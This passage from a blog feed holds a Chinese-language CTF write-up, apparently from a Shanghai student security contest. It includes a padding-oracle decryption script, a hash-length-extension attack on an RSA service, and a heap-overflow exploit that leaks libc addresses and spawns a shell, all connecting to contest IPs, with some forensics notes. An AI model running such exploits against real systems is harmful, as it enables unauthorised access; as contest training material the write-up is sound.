is_paddingæ˜¯æ£€æŸ¥å¯†æ–‡çš„Paddingæœ‰æ•ˆæ€§æ—¶å€™ç”¨åˆ°ï¼Œé»˜è®¤false</span></span><br><span class="line">    pad = exor_pad(pos)</span><br><span class="line">    lastmsg = refill_zero(found_msg.encode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">    getletter = <span class="literal">False</span></span><br><span class="line">    possible_padding = []</span><br><span class="line">    <span class="comment"># å­—å…¸ç ´è§£ï¼Œæˆ‘æœ‰ä¸¤ä¸ªå­—å…¸ï¼šasciiå­—ç¬¦å’Œpaddingé›†åˆ</span></span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> dictinary_:</span><br><span class="line">        gpad = exor_g(guess, pos - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># æ˜¯æŠŠçŒœæƒ³å€¼å’Œlastmsgåšå¼‚æˆ–è¿ç®—ï¼Œèƒ½å¦ç ´è§£æˆåŠŸä¾èµ–Lastmsgçš„æ­£ç¡®æ€§ã€‚</span></span><br><span class="line">        <span class="keyword">if</span> query(hexexor(lastmsg, hexexor(iv, hexexor(gpad, pad))) + ct, conn):</span><br><span class="line">            getletter = <span class="literal">True</span></span><br><span class="line">            new_msg = int2hex(guess).decode(<span class="string">&quot;hex&quot;</span>) + found_msg</span><br><span class="line">            <span class="keyword">if</span> is_padding:</span><br><span class="line">                possible_padding.append(guess)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> new_msg</span><br><span class="line">    <span class="keyword">if</span> is_padding:</span><br><span class="line">        <span class="keyword">return</span> possible_padding</span><br><span class="line">    <span class="keyword">if</span> getletter == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    conn = getConSec()</span><br><span class="line">    blocks = ()   <span class="comment"># å«å››ä¸ªå…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯é•¿åº¦32çš„å­—ç¬¦ä¸²ï¼Œä½¿ç”¨tupleçš„ç›®çš„æ˜¯â€œä¸å¯å˜â€çš„ç‰¹æ€§</span></span><br><span class="line">    <span class="keyword">while</span> ct:</span><br><span class="line">        blocks = blocks + (ct[:<span class="number">32</span>],)</span><br><span class="line">        ct = ct[<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line">    b = input(<span class="string">&quot;input block number to crack:\n#(1~3)&quot;</span>)</span><br><span class="line">    iv = blocks[b - <span class="number">1</span>]   <span class="comment"># æˆªå–å¾…ç ´è§£çš„å‰ä¸€ä¸ªblockä½œä¸ºIVï¼Œå…¶ä»–blockéƒ½å¯ä»¥ä¸¢å¼ƒäº†</span></span><br><span class="line">    block = blocks[b]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æµ‹è¯•æœ€åå­—èŠ‚çš„Paddingæ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">    is_last_block = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># if b == 3:</span></span><br><span class="line">    <span class="comment">#     is_last_block = True</span></span><br><span class="line">    <span class="keyword">if</span> is_last_block:</span><br><span class="line">        possible_paddings = test_a_byte(conn, <span class="string">&#x27;&#x27;</span>, <span class="number">1</span>, padding_chars, iv, block, <span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># æµ‹è¯•ç»è¿‡ç¬¬ä¸€è½®ç­›é€‰å¤„ç†çš„paddingæ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> possible_paddings:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;possible padding size is:&quot;</span>, i</span><br><span class="line">            msg = chr(i) * i</span><br><span class="line">            start_byte = i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> test_a_byte(conn, msg, start_byte, printable_chars, iv, block) != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;good padding size is:&quot;</span>, i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        start_byte = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯¹é€‰å®šçš„blockè¿›è¡Œ16å­—èŠ‚çš„é€ä¸ªå­—èŠ‚ç ´è§£</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(start_byte, <span class="number">17</span>):</span><br><span class="line">        is_found = test_a_byte(conn, msg, pos, printable_chars, iv, block)</span><br><span class="line">        <span class="keyword">if</span> is_found:</span><br><span class="line">            msg = is_found</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;%r&quot;</span> % msg</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;can&#x27;t found the last #%d byte&quot;</span> % pos</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> is_last_block <span class="keyword">and</span> msg:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;After cutting padding off, the last block is:\n%r&quot;</span> % msg[:-(start_byte - <span class="number">1</span>)]</span><br></pre></td></tr></table></figure><h1 id="clemency"><a href="#clemency" class="headerlink" title="clemency"></a>clemency</h1><p>hitconå›½å†…å‚èµ›é€‰æ‰‹æè¿‡çš„ä¸€ä¸ªæ¶æ„<br>9bitä»£æ›¿äº†8bit<br>åœ¨githubæ‰¾äº†ä¸ª<a href="https://github.com/cseagle/ida_clemency">idaæ’ä»¶</a><br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/64717057.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/64717057.jpg"></a></p><h1 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h1><p>æœç´¢flagå…³é”®å­—ï¼Œå‘ç°åœ¨ä¸€ä¸ªftpåŒ…ä¸­å«æœ‰flag.zipç­‰å­—æ ·<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/75747794.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/75747794.jpg"></a><br>è¿‡æ»¤å¾—åˆ°ftpå®Œæ•´é€šä¿¡æµç¨‹å°†ä¼ è¾“çš„zipæ–‡ä»¶å¯¼å‡ºï¼Œæœ‰å¯†ç çš„å‹ç¼©åŒ…ï¼Œé‡Œé¢æ˜¯flag.txt<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/13131227.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/13131227.jpg"></a><br>é€šè¿‡ftp||ftp-dataè¿‡æ»¤å°†key.logå¯¼å‡º<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/2601669.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/2601669.jpg"></a><br>å¯¼å…¥key.logä¸ºsslè¯ä¹¦<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/26430276.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/26430276.jpg"></a><br>å¯¼å…¥httpå¯¹è±¡<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/17178874.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/17178874.jpg"></a><br>æ‰“å¼€åä¸ºå‹ç¼©åŒ…å«mp3ï¼Œè¿›è¡Œåˆ†æ<br><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11020176.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11020176.jpg"></a><br>æ‹¿åˆ°å‹ç¼©åŒ…åˆ°å¯†ç </p><h1 id="rrrsa"><a href="#rrrsa" class="headerlink" title="rrrsa"></a>rrrsa</h1><p>hashæ‰©å±•æ”»å‡» ï¼Œè®©ç”¨æˆ·åé‡Œå‡ºç°rootï¼Œç„¶åå°±å¯ä»¥å†ç”Ÿæˆä¸€å¯¹edï¼ŒåŒæ—¶èƒ½çœ‹åˆ°è€çš„edï¼Œå¦‚æœä¸¤æ¬¡eç›¸åŒï¼Œé‚£å°±ç›¸å½“äºæ‹¿åˆ°däº†ï¼Œç„¶åè¯·æ±‚ä¸€æ¬¡å¯†æ–‡å°±ok</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConSec</span>():</span></span><br><span class="line">    conn = remote(<span class="string">&#x27;106.75.98.74&#x27;</span>,<span class="number">10030</span>)</span><br><span class="line">    token = conn.recv()[<span class="number">-33</span>:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    conn.recv()</span><br><span class="line">    <span class="keyword">return</span> conn,token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSameE</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, token = getConSec()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;start&#x27;</span></span><br><span class="line">        h = hashpumpy.hashpump(token, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="number">8</span>)</span><br><span class="line">        conn.send(<span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.send(h[<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.send(h[<span class="number">0</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        e = conn.recvline()</span><br><span class="line">        e = int(e[<span class="number">4</span>:])</span><br><span class="line">        d = conn.recvline()</span><br><span class="line">        d = int(d[<span class="number">4</span>:])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;e&#x27;</span>,e</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;d&#x27;</span>,d</span><br><span class="line">        conn.recv()</span><br><span class="line">        conn.recv()</span><br><span class="line">        </span><br><span class="line">        conn.send(<span class="string">&#x27;2\n&#x27;</span>)</span><br><span class="line">        n = conn.recvline()</span><br><span class="line">        n = int(n[<span class="number">4</span>:])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;n&#x27;</span>, n</span><br><span class="line">        e2 = conn.recvline()</span><br><span class="line">        e2 = int(e2[<span class="number">4</span>:])</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;finish&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> e2 == e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;----------------```````````````````---------------------&#x27;</span></span><br><span class="line">            conn.send(<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">            f = conn.recv()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;f&#x27;</span> , f</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> f, e, d, n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&#x27;not equal&#x27;</span></span><br><span class="line">            <span class="keyword">print</span> e2</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            conn.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    flag_enc, e, d, n = findSameE()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;flag_enc :&gt;&gt;&#x27;</span>, flag_enc</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;e and d and n&#x27;</span>, e, d, n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°æ•°æ®åè¿›è¡Œè§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">f = <span class="number">14683015815664558563801576941259873798326690167651050048605500438701684408496420446210954963532410318389297642966435854745489938317707457853711466218044289065290845837536321014853684020186460366403221101008046326997159780567723107338094785513531848765406240418605856262554526167176997869744050412437697207716369805258141774488366641109964920618527096963297754238554764407150841812474020940377383920892323044658675143281286681485516457951570278828305838636179900402944417184295742821658797425171138893795809447102808748184072282008730049190002045912253021436715877710641309577427718880947231481979509491773821558495630</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">42557</span></span><br><span class="line">d = <span class="number">1405803797689753766121124816811438406635097169509938302560321650694887683763354544832446421618462783636223460691651260024139139681435555981044230096841532923821590682557001444031830233529733318151758359126991717193768181340465430448286701933168519305144478953071981857058771098824813044597941221483519691463328674245665508867881940139408259177240035345986021535415530440683317357792630367912626512879140394887502781711233045371334777186553583913805249735850457844171355581182981430494538414242574735347168419095760484924117877688500538899280429652142746708737501656061740113932258961396160464225966939430889959741717</span></span><br><span class="line">n = <span class="number">14713918400954955982493042014029607543327552937244083704392427075411297382665292514617418191051874245746867146250517135476460739651464081624520241080001258396231046403732983387521544330625888052283418713567975039010130962446184781994032753116048370897450465028500819451758514917040720299792076872275983155338383970086972864937471593525080347940764126191055849932929374654181884571725974013062466998817258204252680163981682275618928317547959032958679930767406984643684388270842181251832310744561071776712068724629196823024610536091642933627694285340404564988534606855524020291041210781629240781218089956911861804824793</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(pow(f,d,n))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *     </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uint32</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> c_uint32(x).value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">str</span>):</span></span><br><span class="line">     log.info(str)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> log.info(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">js</span>(<span class="params">str</span>):</span></span><br><span class="line">     <span class="keyword">return</span> io.recvuntil(str)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsn</span>(<span class="params">num</span>):</span></span><br><span class="line">     <span class="keyword">if</span> num:</span><br><span class="line">          <span class="keyword">return</span> io.recvn(num+<span class="number">1</span>)</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">return</span> io.recvn(num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fs</span>(<span class="params">str</span>):</span></span><br><span class="line">     io.sendline(str)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fsn</span>(<span class="params">str</span>):</span></span><br><span class="line">     io.send(str)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stop</span>():</span></span><br><span class="line">     <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">      time.sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">name,vaule</span>):</span></span><br><span class="line">    string=<span class="string">&#x27;\n=====&gt;&#x27;</span>+str(name)+<span class="string">&#x27; :&#x27;</span>+str(vaule)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">print</span> string</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">string</span>):</span></span><br><span class="line">    raw_input(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellcode</span>():</span></span><br><span class="line">    <span class="keyword">return</span> asm(shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###setting</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">log=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">     io=process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">     libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     io=remote(<span class="string">&#x27;106.75.8.58&#x27;</span>,<span class="number">23238</span>)</span><br><span class="line">     libc = ELF(<span class="string">&#x27;./libc&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> log:</span><br><span class="line">     context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">     gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#user code =============================</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">len1,len2</span>):</span></span><br><span class="line">    js(<span class="string">&#x27;option:&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;please input the length of name&#x27;</span>)</span><br><span class="line">    fs(str(len1))</span><br><span class="line">    js(<span class="string">&#x27;please input name&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;a&#x27;</span>*len1)</span><br><span class="line">    js(<span class="string">&#x27;please input the length of schoolname&#x27;</span>)</span><br><span class="line">    fs(str(len2))</span><br><span class="line">    js(<span class="string">&#x27;please input the school name&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;b&#x27;</span>*len2)</span><br><span class="line">    js(<span class="string">&#x27;is a tutor?(yes/no)&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span>(<span class="params">id1,len1,name1</span>):</span></span><br><span class="line">    js(<span class="string">&#x27;option:&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;input a id to edit&#x27;</span>)</span><br><span class="line">    fs(str(id1))</span><br><span class="line">    js(<span class="string">&#x27;input an option to edit a member.&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;please input the length of new schoolname&#x27;</span>)</span><br><span class="line">    fs(str(len1))</span><br><span class="line">    js(<span class="string">&#x27;please input new schoolname&#x27;</span>)</span><br><span class="line">    fs(name1)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit1</span>(<span class="params">id1,len1,name1</span>):</span></span><br><span class="line">    js(<span class="string">&#x27;option:&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;input a id to edit&#x27;</span>)</span><br><span class="line">    fs(str(id1))</span><br><span class="line">    js(<span class="string">&#x27;input an option to edit a member.&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;please input the length of&#x27;</span>)</span><br><span class="line">    fs(str(len1))</span><br><span class="line">    js(<span class="string">&#x27;please input new&#x27;</span>)</span><br><span class="line">    fs(name1)</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">id1</span>):</span></span><br><span class="line">    js(<span class="string">&#x27;option:&#x27;</span>)</span><br><span class="line">    fs(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    js(<span class="string">&#x27;input a id to intro&#x27;</span>)</span><br><span class="line">    fs(id1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        add(<span class="number">40</span>,<span class="number">40</span>)</span><br><span class="line">    dbg(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)</span><br><span class="line">    pl=<span class="number">72</span>*<span class="string">&#x27;c&#x27;</span>+p64(<span class="number">0x60f037</span>)+p64(<span class="number">8</span>)</span><br><span class="line">    edit2(<span class="number">99</span>,<span class="number">88</span>,pl)</span><br><span class="line">    <span class="comment">#dbg(&#x27;2&#x27;)</span></span><br><span class="line">    edit1(<span class="number">100</span>,<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    dbg(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)</span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)</span><br><span class="line">    pl2=<span class="number">72</span>*<span class="string">&#x27;c&#x27;</span>+p64(<span class="number">0x603030</span>)+p64(<span class="number">8</span>)+p64(<span class="number">0x04007A0</span>)+p64(<span class="number">0x603030</span>)+p64(<span class="number">8</span>)</span><br><span class="line">    edit2(<span class="number">101</span>,<span class="number">112</span>,pl2)</span><br><span class="line">    dbg(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    show(<span class="string">&#x27;102&#x27;</span>)</span><br><span class="line">    data=jsn(<span class="number">7</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    data=u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_addr=data<span class="number">-0x3c48e0</span></span><br><span class="line">    mark(<span class="string">&#x27;libc_addr&#x27;</span>,hex(libc_addr))</span><br><span class="line">    <span class="comment">#malloc_hook=0x3c4b10+libc_addr</span></span><br><span class="line">    <span class="comment">#mark(&#x27;malloc_hook&#x27;,hex(malloc_hook))</span></span><br><span class="line">    one_gadgets=<span class="number">0x4526A</span>+libc_addr </span><br><span class="line">    mark(<span class="string">&#x27;one_gadgets&#x27;</span>,hex(one_gadgets))</span><br><span class="line">    </span><br><span class="line">    sh_addr=libc_addr+<span class="number">0x18CD17</span></span><br><span class="line">    system_addr=libc_addr+<span class="number">0x45390</span></span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)<span class="comment">#103</span></span><br><span class="line">    add(<span class="number">40</span>,<span class="number">40</span>)<span class="comment">#104</span></span><br><span class="line">    pl3=<span class="number">72</span>*<span class="string">&#x27;c&#x27;</span>+p64(sh_addr)+p64(<span class="number">0x330e9</span>)+p64(system_addr)+p64(<span class="number">0x603000</span>)+p64(<span class="number">8</span>)</span><br><span class="line">    edit2(<span class="number">103</span>,<span class="number">112</span>,pl3)</span><br><span class="line">    dbg(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">    show(<span class="string">&#x27;104&#x27;</span>)</span><br><span class="line">    shell()</span><br></pre></td></tr></table></figure><h1 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h1><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11091834.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/11091834.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¬¬ä¸‰å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
